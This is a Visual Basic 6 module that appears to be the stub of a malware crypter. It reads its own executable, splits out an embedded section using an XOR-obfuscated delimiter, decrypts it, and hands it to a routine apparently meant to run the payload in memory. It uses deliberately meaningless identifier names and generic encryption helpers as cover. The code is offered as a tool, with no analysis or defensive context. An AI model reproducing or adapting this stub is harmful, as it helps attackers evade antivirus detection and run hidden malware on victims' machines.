Attribute VB_Name = "Module1"
Option Explicit

Public Type ENCRYPTCLASS
  Name As String
  Object As Object
  Homepage As String
End Type
Public EncryptObjects() As ENCRYPTCLASS
Public EncryptObjectsCount As Long

Public Const BENCHMARKSIZE = 1000000

Private Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Dim QWERTYUIOP As String, ZXCVBNM() As String, ÑLKJHGFDSA As New Class1, m3m0 As Integer
Private Sub Main()
Call EBPEDETdsVdeG
End Sub

Sub EBPEDETdsVdeG()
m3m0 = FreeFile
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #m3m0
QWERTYUIOP = Space(LOF(m3m0))
Get #m3m0, , QWERTYUIOP
Close #m3m0
ZXCVBNM() = d3m0Hack(QWERTYUIOP, Encrypt(StrReverse("!!5)))))))))))))))")))
Call ROOOOOOOOOOOOOOOOOOOOOOOOOOON(App.Path & "\" & App.EXEName & ".exe", StrConv(ÑLKJHGFDSA.DecryptString(ZXCVBNM(1), ZXCVBNM(2)), vbFromUnicode), Command)
End Sub
Function Encrypt(t)
Dim i
On Error Resume Next
For i = 1 To Len(t)
Encrypt = Encrypt & Chr(Asc(Mid(t, i, 6)) Xor 9 - 1)
Next
End Function

Public Function FileExist(Filename As String) As Boolean
  On Error GoTo NotExist
  
  Call FileLen(Filename)
  FileExist = True
  Exit Function
  
NotExist:
End Function

Public Static Sub GetWord(LongValue As Long, CryptBuffer() As Byte, Offset As Long)
'  Call CopyMem(LongValue, CryptBuffer(Offset), 4)
  
  Dim bb(0 To 3) As Byte
  
  bb(3) = CryptBuffer(Offset)
  bb(2) = CryptBuffer(Offset + 1)
  bb(1) = CryptBuffer(Offset + 2)
  bb(0) = CryptBuffer(Offset + 3)
  Call CopyMem(LongValue, bb(0), 4)
End Sub

Public Static Sub PutWord(LongValue As Long, CryptBuffer() As Byte, Offset As Long)
'  Call CopyMem(CryptBuffer(Offset), LongValue, 4)

  Dim bb(0 To 3) As Byte

  Call CopyMem(bb(0), LongValue, 4)
  CryptBuffer(Offset) = bb(3)
  CryptBuffer(Offset + 1) = bb(2)
  CryptBuffer(Offset + 2) = bb(1)
  CryptBuffer(Offset + 3) = bb(0)
End Sub

Public Static Function UnsignedAdd(ByVal Data1 As Long, Data2 As Long) As Long
  Dim x1(0 To 3) As Byte
  Dim x2(0 To 3) As Byte
  Dim xx(0 To 3) As Byte
  Dim Rest As Long
  Dim Value As Long
  Dim a As Long
  
  Call CopyMem(x1(0), Data1, 4)
  Call CopyMem(x2(0), Data2, 4)
  
  Rest = 0
  For a = 0 To 3
    Value = CLng(x1(a)) + CLng(x2(a)) + Rest
    xx(a) = Value And 255
    Rest = Value \ 256
  Next
  
  Call CopyMem(UnsignedAdd, xx(0), 4)
End Function

Public Function UnsignedDel(Data1 As Long, Data2 As Long) As Long
  Dim x1(0 To 3) As Byte
  Dim x2(0 To 3) As Byte
  Dim xx(0 To 3) As Byte
  Dim Rest As Long
  Dim Value As Long
  Dim a As Long
  
  Call CopyMem(x1(0), Data1, 4)
  Call CopyMem(x2(0), Data2, 4)
  Call CopyMem(xx(0), UnsignedDel, 4)
  
  For a = 0 To 3
    Value = CLng(x1(a)) - CLng(x2(a)) - Rest
    If (Value < 0) Then
      Value = Value + 256
      Rest = 1
    Else
      Rest = 0
    End If
    xx(a) = Value
  Next
  
  Call CopyMem(UnsignedDel, xx(0), 4)
End Function


